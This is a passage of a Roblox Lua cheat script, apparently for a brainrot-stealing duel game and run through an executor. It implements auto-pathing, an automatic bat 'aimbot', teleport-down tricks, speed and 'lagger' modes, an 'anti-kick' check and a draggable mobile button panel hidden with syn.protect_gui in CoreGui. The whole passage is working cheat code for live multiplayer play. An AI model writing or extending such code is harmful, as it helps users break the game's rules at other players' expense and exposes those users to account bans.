    if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
    M.alPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
end

function M.stopAutoRight()
    M.autoRightEnabled = false
    if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
    M.arPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
end

-- Original fixed-path Auto Left / Right (as before)
function M.startAutoLeft()
    if M.alConn then M.alConn:Disconnect() end
    M.alPhase = 1
    M.autoLeftEnabled = true
    M.alConn = RunService.Heartbeat:Connect(function()
        if not M.autoLeftEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.alPhase == 1 then
            local tgt = Vector3.new(M.AP_L1.X, hrp.Position.Y, M.AP_L1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.alPhase = 2
                local d = M.AP_L2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_L1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.alPhase == 2 then
            local tgt = Vector3.new(M.AP_L2.X, hrp.Position.Y, M.AP_L2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoLeftEnabled = false
                if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
                M.alPhase = 1
                if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                return
            end
            local d = M.AP_L2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._alSwingDebounce then
            M._alSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._alSwingDebounce = false end)
        end
    end)
end

function M.startAutoRight()
    if M.arConn then M.arConn:Disconnect() end
    M.arPhase = 1
    M.autoRightEnabled = true
    M.arConn = RunService.Heartbeat:Connect(function()
        if not M.autoRightEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.arPhase == 1 then
            local tgt = Vector3.new(M.AP_R1.X, hrp.Position.Y, M.AP_R1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.arPhase = 2
                local d = M.AP_R2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_R1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.arPhase == 2 then
            local tgt = Vector3.new(M.AP_R2.X, hrp.Position.Y, M.AP_R2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoRightEnabled = false
                if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
                M.arPhase = 1
                if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                return
            end
            local d = M.AP_R2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._arSwingDebounce then
            M._arSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._arSwingDebounce = false end)
        end
    end)
end

function M.enableAntiKick()
    M.antiKickEnabled = true
    task.spawn(function()
        while M.antiKickEnabled do
            task.wait(0.5)
            local char = player.Character
            if char then
                local found = false
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        local n = tool.Name:lower()
                        if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
                            found = true
                            break
                        end
                    end
                end
                M.brainrotDetected = found
                if found then
                    if M.autoBatEnabled then M.stopBatAimbot() end
                    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
                    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
                end
            end
        end
    end)
end

function M.disableAntiKick()
    M.antiKickEnabled = false
    M.brainrotDetected = false
end

--------------------------------------------------------------------------------
-- SAFE MODE (locks combat during duel countdown / while holding brainrot)
--------------------------------------------------------------------------------
function M.safeModeGetCountdownLabel()
    local ok, label = pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        if not pg then return nil end
        local top = pg:FindFirstChild("DuelsMachineTopFrame")
        if not top then return nil end
        local inner = top:FindFirstChild("DuelsMachineTopFrame")
        if not inner then return nil end
        local timer = inner:FindFirstChild("Timer")
        if not timer then return nil end
        return timer:FindFirstChild("Label")
    end)
    return (ok and label) or nil
end

function M.safeModeCountdownNumber(text)
    local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
    if t == "GO" or t == "START" or t == "READY" then return true end
    local n = tonumber(t)
    return n ~= nil and n >= 0 and n <= 10
end

function M.safeModeInDuelCountdown()
    local label = M.safeModeGetCountdownLabel()
    return label and M.safeModeCountdownNumber(label.Text) or false
end

M.SAFE_MODE_BLOCKED_TOOLS = {
    bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
    medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
}

function M.safeModeIsCarryableTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local name = tool.Name:lower()
    for word in pairs(M.SAFE_MODE_BLOCKED_TOOLS) do
        if name:find(word, 1, true) then return false end
    end
    return true
end

function M.safeModeHoldingBrainrot()
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return player:GetAttribute("AntiKick") end)
    if ok2 and val2 == true then return true end
    local char = player.Character
    if not char then return false end
    local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok3 and val3 == true then return true end
    if M.brainrotDetected then return true end
    if M.hasBrainrotInHand and M.hasBrainrotInHand() then return true end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    return false
end

function M.safeModeIsLocked()
    if not M.safeModeEnabled then return false end
    return M.safeModeInDuelCountdown() or M.safeModeHoldingBrainrot()
end

function M.safeModeForceStop(reason)
    local stopped = false
    if M.autoBatEnabled then
        M.stopBatAimbot()
        stopped = true
    end
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
        stopped = true
    end
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
        stopped = true
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
        stopped = true
    end
    if stopped then
        -- optional toast; silent if no notifier
        pcall(function()
            if type(showActionNotification) == "function" then
                showActionNotification(reason or "SAFE MODE LOCK")
            end
        end)
    end
end

function M.safeModeTryStart()
    if M.safeModeIsLocked() then
        M.safeModeForceStop("SAFE MODE LOCK")
        return false
    end
    return true
end

function M.enableSafeMode()
    M.safeModeEnabled = true
end

function M.disableSafeMode()
    M.safeModeEnabled = false
end

if not M._safeModeMonitorStarted then
    M._safeModeMonitorStarted = true
    local _safeAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        if not M.safeModeEnabled then return end
        _safeAcc = _safeAcc + (dt or 0.016)
        if _safeAcc < 0.2 then return end
        _safeAcc = 0
        if M.safeModeIsLocked() then
            M.safeModeForceStop("SAFE MODE LOCK")
        end
    end)
end

--------------------------------------------------------------------------------
-- MIRROR TP DOWN (teleport down when opponent drops while aimbot is on)
--------------------------------------------------------------------------------
function M.mirrorTPAimbotActive()
    return M.autoBatEnabled == true or M.bypassAimbotEnabled == true
end

function M.mirrorTPTeleportDown()
    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end
    local now = tick()
    if now - (M.mirrorTPLastTeleport or 0) < 0.08 then return end
    M.mirrorTPLastTeleport = now
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    local y = (M.MIRROR_TP_DOWN_Y or -7) + (math.random() * 0.6 - 0.3)
    root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    root.AssemblyLinearVelocity = Vector3.new((math.random()-0.5)*0.4, 0, (math.random()-0.5)*0.4)
end

if not M._mirrorTPStarted then
    M._mirrorTPStarted = true
    RunService.Heartbeat:Connect(function()
        if not M.mirrorTPDownEnabled or not M.mirrorTPAimbotActive() then
            if next(M.mirrorTPPreviousY) then
                table.clear(M.mirrorTPPreviousY)
            end
            return
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local currentY = root.Position.Y
                    local previousY = M.mirrorTPPreviousY[plr.UserId]
                    if previousY and previousY - currentY >= (M.MIRROR_TP_DROP_THRESHOLD or 3) then
                        pcall(M.mirrorTPTeleportDown)
                        table.clear(M.mirrorTPPreviousY)
                        return
                    end
                    M.mirrorTPPreviousY[plr.UserId] = currentY
                end
            end
        end
    end)
end

function M.setMirrorTPDown(enabled)
    M.mirrorTPDownEnabled = enabled == true
    if not M.mirrorTPDownEnabled then
        table.clear(M.mirrorTPPreviousY)
    end
    if M.setMirrorTPVisual then M.setMirrorTPVisual(M.mirrorTPDownEnabled) end
end


function M.isStealState()
    -- Match auto-switch carry script: WalkSpeed drops while carrying / stealing
    local char = player.Character
    if not char then return false end
    if M.hasBrainrotInHand() then return true end
    local h = char:FindFirstChildOfClass("Humanoid")
    if h and h.WalkSpeed < 25 then return true end
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2 == true then return true end
    return false
end

function M.getActiveMoveSpeed()
    -- Auto Carry Speed: pick speed from steal state without forcing mode flags every frame
    if M.autoSwitchSpeedEnabled then
        local isSteal = M.isStealState()
        local inLagger = M.laggerModeEnabled or M.laggerCarryActive
        if inLagger then
            return isSteal and M.LAGGER_CARRY_SPEED or M.LAGGER_SPEED
        end
        return isSteal and M.CS or M.NS
    end

    -- Manual modes
    if M.hasBrainrotInHand() then
        return M.LAGGER_CARRY_SPEED
    end
    if M.laggerCarryActive then return M.LAGGER_CARRY_SPEED
    elseif M.laggerModeEnabled then return M.LAGGER_SPEED
    elseif M.carrySpeedActive then return M.CS
    else return M.NS end
end

function M.getAutoPathSpeed()
    if M.laggerModeEnabled or M.laggerCarryActive then return M.LAGGER_SPEED
    else return M.NS end
end

function M.setModeNormalFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.setModeCarryFlags()
    M.carrySpeedActive = true
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.setModeLaggerCarryFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = true
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.stopWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then
        pcall(function() M._autoSwitchSpeedConn:Disconnect() end)
        M._autoSwitchSpeedConn = nil
    end
end

function M.startWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then return end
    M._autoSwitchSpeedConn = RunService.Heartbeat:Connect(function()
        if not M.autoSwitchSpeedEnabled and not M.autoTurnOffSpeedEnabled and not M.autoSwitchLaggerSpeedEnabled then
            M.stopWalkSpeedAutoSwitch()
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local ws = hum.WalkSpeed or 16
        local thr = tonumber(M.AUTO_SWITCH_THRESHOLD) or 25

        -- Auto Switch Speed: game lowered WalkSpeed -> turn on carry
        if M.autoSwitchSpeedEnabled and ws <= thr and not M.carrySpeedActive and not M.laggerCarryActive then
            M.setModeCarryFlags()
        -- Auto Turn Off Speed: WalkSpeed back above threshold -> normal
        elseif M.autoTurnOffSpeedEnabled and ws > thr and M.carrySpeedActive then
            M.setModeNormalFlags()
        end

        -- Auto Switch Lagger: low WalkSpeed -> lagger carry; high -> normal
        if M.autoSwitchLaggerSpeedEnabled and ws <= thr and not M.laggerCarryActive and not M.laggerModeEnabled then
            M.setModeLaggerCarryFlags()
        elseif M.autoSwitchLaggerSpeedEnabled and ws > thr and (M.laggerCarryActive or M.laggerModeEnabled) then
            M.setModeNormalFlags()
        end
    end)
end

function M.refreshWalkSpeedAutoSwitch()
    if M.autoSwitchSpeedEnabled or M.autoTurnOffSpeedEnabled or M.autoSwitchLaggerSpeedEnabled then
        M.startWalkSpeedAutoSwitch()
    else
        M.stopWalkSpeedAutoSwitch()
    end
end

function M.updateAutoSwitchSpeed()
    -- Steal-based auto carry (existing)
    if M.autoSwitchSpeedEnabled then
        local isSteal = M.isStealState()
        if isSteal ~= M._autoSwitchWasSteal then
            M._autoSwitchWasSteal = isSteal
            local inLagger = M.laggerModeEnabled or M.laggerCarryActive
            if isSteal then
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
                end
            else
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
                    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
                    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
                end
            end
            if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        end
    end
end

function M.isRagdollState(hum)
    if not hum then return true end;local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end

function M.runDrop()
    if M.dropActive then return end
    M.stopAutoTPForAction()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    M.dropActive = true
    local startTime = tick()
    local dropConn
    dropConn = RunService.Heartbeat:Connect(function()
        local currentChar = player.Character
        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        if not currentChar or not currentRoot then
            if dropConn then dropConn:Disconnect() end
            M.dropActive = false
            return
        end
        if tick() - startTime >= M.DROP_ASCEND_DURATION then
            if dropConn then dropConn:Disconnect() end
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {currentChar}
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
            if rayResult then
                local hum = currentChar:FindFirstChildOfClass("Humanoid")
                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
                currentRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                currentRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
            M.dropActive = false
            return
        end
        currentRoot.Velocity = Vector3.new(currentRoot.Velocity.X, M.DROP_ASCEND_SPEED, currentRoot.Velocity.Z)
    end)
end

function M.stopAutoTPForAction()
    if M.autoTPEnabled then
        M.stopAutoTP()
        pcall(function() if M.setAutoTPVisual then M.setAutoTPVisual(false) end end)
        pcall(function() if M.saveConfig then M.saveConfig() end end)
    end
end


local function setupDeathReset()
    if M.autoResetOnDeath then
        local char = player.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                if M._deathResetConn then M._deathResetConn:Disconnect() end
                M._deathResetConn = hum.Died:Connect(function()
                    if M.autoResetOnDeath then
                        M.instaReset()
                    end
                end)
            end
        end
        if not M._deathResetCharAdded then
            M._deathResetCharAdded = player.CharacterAdded:Connect(function(char)
                task.wait(0.5)
                setupDeathReset()
            end)
        end
    else
        if M._deathResetConn then M._deathResetConn:Disconnect(); M._deathResetConn = nil end
        if M._deathResetCharAdded then M._deathResetCharAdded:Disconnect(); M._deathResetCharAdded = nil end
    end
end

function M.startRemoveAcc()
    if M.removeAccEnabled then return end
    M.removeAccEnabled = true
    local function removeAccDo()
        if not M.removeAccEnabled then return end
        local char = player.Character
        if not char then return end
        for _,obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Accessory") or obj:IsA("Hat") then
                if not M.removedAccessories[obj] then
                    M.removedAccessories[obj] = true
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end
    removeAccDo()
    M.removeAccConn = player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if M.removeAccEnabled then removeAccDo() end
    end)
end

function M.stopRemoveAcc()
    M.removeAccEnabled = false
    if M.removeAccConn then
        M.removeAccConn:Disconnect()
        M.removeAccConn = nil
    end
    M.removedAccessories = {}
end

-- ============================================================
-- MOBILE BUTTONS (trascinabili singolarmente)
-- ============================================================
function M.destroyMobileButtons()
    if M.mobGuiRef then
        pcall(function() M.mobGuiRef:Destroy() end)
        M.mobGuiRef = nil
    end
    for _,n in ipairs({"MoveeMobileButtons"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(n); if old then old:Destroy() end
        local pgui = player:FindFirstChild("PlayerGui"); if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end
    end
    M.mobBtnRefs = {}
end

function M.loadBtnPositions()
    if not(isfile and isfile(M.MOB_POS_FILE)) then return {} end
    local ok, data = pcall(function() return HS:JSONDecode(readfile(M.MOB_POS_FILE)) end)
    if ok and type(data)=="table" then return data end
    return {}
end

function M.saveBtnPositions()
    if not writefile then return end
    if not M.mobGuiRef then return end
    local out = {}
    for _,child in ipairs(M.mobGuiRef:GetDescendants()) do
        if child:IsA("TextButton") and child:GetAttribute("BtnKey") then
            local key = child:GetAttribute("BtnKey")
            out[key] = {x=child.Position.X.Offset, y=child.Position.Y.Offset}
        end
    end
    pcall(function() writefile(M.MOB_POS_FILE, HS:JSONEncode(out)) end)
end

function M.resetMobilePositions()
    -- Clear saved positions (os.remove often missing in executors)
    pcall(function()
        if type(delfile) == "function" then
            delfile(M.MOB_POS_FILE)
        elseif type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    pcall(function()
        if isfile and isfile(M.MOB_POS_FILE) and type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    M._forceDefaultMobPos = true
    M.buildMobileButtons()
    M._forceDefaultMobPos = false
    -- Snap any leftover to defaults again after build
    pcall(function()
        if not M.mobGuiRef then return end
        local out = {}
        for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
            if child:IsA("TextButton") and child:GetAttribute("BtnKey") then
                local key = child:GetAttribute("BtnKey")
                local dx = child:GetAttribute("DefaultX")
                local dy = child:GetAttribute("DefaultY")
                if typeof(dx) == "number" and typeof(dy) == "number" then
                    child.Position = UDim2.new(0, dx, 0, dy)
                    out[key] = {x = dx, y = dy}
                end
            end
        end
        if writefile then
            writefile(M.MOB_POS_FILE, HS:JSONEncode(out))
        end
    end)
end

function M.buildMobileButtons()
    M.destroyMobileButtons()
    if not M.mobileButtonsEnabled then return end

    local savedPositions = M._forceDefaultMobPos and {} or M.loadBtnPositions()
    local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(800,600)

    -- Botones cuadrados con esquinas redondeadas
    local side = math.max(48, math.floor(M.mobileButtonsSize * M.uiScale * 0.72))
    local BTN_H, BTN_W = side, side
    local CORNER_R = 14

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "MoveeMobileButtons"
    mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 15
    mobGui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then
        mobGui.Parent = player:WaitForChild("PlayerGui")
    end
    M.mobGuiRef = mobGui

    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    local BTN_OFF   = UI_BTN_BG or UI_ROW_BG or Color3.new(
        math.clamp(accent.R * 0.22, 0, 1),
        math.clamp(accent.G * 0.22, 0, 1),
        math.clamp(accent.B * 0.22, 0, 1)
    )
    local BTN_ON    = accent
    local TXT_OFF   = Color3.fromRGB(255, 255, 255)
    local TXT_ON    = Color3.fromRGB(0, 0, 0)
    -- If accent is very dark, keep on-text readable
    if (accent.R + accent.G + accent.B) < 0.45 then
        TXT_ON = Color3.fromRGB(255, 255, 255)
    end

    local btnDefs = {
        {"drop", "DROP\nBRAINROT", false},
        {"autoLeft", "AUTO\nLEFT", true},
        {"autoBat", "AUTO\nBAT", true},
        {"autoRight", "AUTO\nRIGHT", true},
        {"tpDown", "TP\nDOWN", false},
        {"carrySpeed", "CARRY\nSPEED", true},
        {"lagger", "LAGGER\nMODE", true},
        {"instaReset", "INSTA\nRESET", false},
        {"laggerCarry", "LAGGER\nCARRY", true},
        {"bypass", "BYPASS\nAIM", true},
        {"tpBat", "BAT\nTP", true},
    }

    local cols = 2
    local gap = 8
    local padding = 6
    local startX = vp.X - (cols * (BTN_W + gap)) - padding
    local startY = 50

    for i, def in ipairs(btnDefs) do
        local key = def[1]
        local label = def[2]
        local isToggle = def[3]

        local row = math.floor((i-1) / cols)
        local col = (i-1) % cols
        local defaultX = startX + col * (BTN_W + gap)
        local defaultY = startY + row * (BTN_H + gap)

        local saved = (not M._forceDefaultMobPos) and savedPositions[key] or nil
        local posX = (saved and type(saved.x) == "number") and saved.x or defaultX
        local posY = (saved and type(saved.y) == "number") and saved.y or defaultY

        local btn = Instance.new("TextButton")
        btn.Name = "Btn_" .. key
        btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
        btn.Position = UDim2.new(0, posX, 0, posY)
        btn:SetAttribute("DefaultX", defaultX)
        btn:SetAttribute("DefaultY", defaultY)
        btn.BackgroundColor3 = BTN_OFF
        btn.BackgroundTransparency = 0.05
        btn.Text = label
        btn.TextColor3 = TXT_OFF
        btn.TextSize = 10
        btn.Font = Enum.Font.GothamBlack
        btn.TextWrapped = true
        btn.BorderSizePixel = 0
        btn.ZIndex = 101
        btn.AutoButtonColor = false
        btn:SetAttribute("BtnKey", key)
        btn.Parent = mobGui

        -- Cuadrados con bordes redondeados + brillo naranja (sin imagenes)
        local corner = Instance.new("UICorner", btn)
        corner.CornerRadius = UDim.new(0, 14)
        btn.TextStrokeTransparency = 0.35
        btn.TextStrokeColor3 = Color3.fromRGB(255, 180, 60)
        do
            local st0 = Instance.new("UIStroke")
            st0.Name = "BtnStroke"
            st0.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            st0.Color = Color3.fromRGB(255, 170, 50)
            st0.Thickness = 2.5
            st0.Transparency = 0.15
            st0.Parent = btn
            -- segundo stroke para glow / brillo
            local glow = Instance.new("UIStroke")
            glow.Name = "BtnGlow"
            glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            glow.Color = Color3.fromRGB(255, 200, 80)
            glow.Thickness = 5
            glow.Transparency = 0.55
            glow.Parent = btn
        end
        -- sin imagenes en botones

        local isOn = false
        local function setOn(v)
            isOn = v
            local stroke = btn:FindFirstChild("BtnStroke")
            if not stroke then
                stroke = Instance.new("UIStroke")
                stroke.Name = "BtnStroke"
                stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                stroke.Parent = btn
            end
            local glow = btn:FindFirstChild("BtnGlow")
            if v then
                TweenService:Create(btn, TweenInfo.new(0.12), {
                    BackgroundColor3 = BTN_ON,
                    TextColor3 = TXT_ON,
                }):Play()
                btn.TextStrokeColor3 = Color3.fromRGB(255, 220, 120)
                btn.TextStrokeTransparency = 0.2
                stroke.Color = Color3.fromRGB(255, 210, 100)
                stroke.Thickness = 3
                stroke.Transparency = 0
                if glow then
                    glow.Color = Color3.fromRGB(255, 230, 120)
                    glow.Thickness = 7
                    glow.Transparency = 0.35
                end
            else
                TweenService:Create(btn, TweenInfo.new(0.12), {
                    BackgroundColor3 = BTN_OFF,
                    TextColor3 = TXT_OFF,
                }):Play()
                btn.TextStrokeColor3 = Color3.fromRGB(255, 180, 60)
                btn.TextStrokeTransparency = 0.35
                stroke.Color = Color3.fromRGB(255, 170, 50)
                stroke.Thickness = 2.5
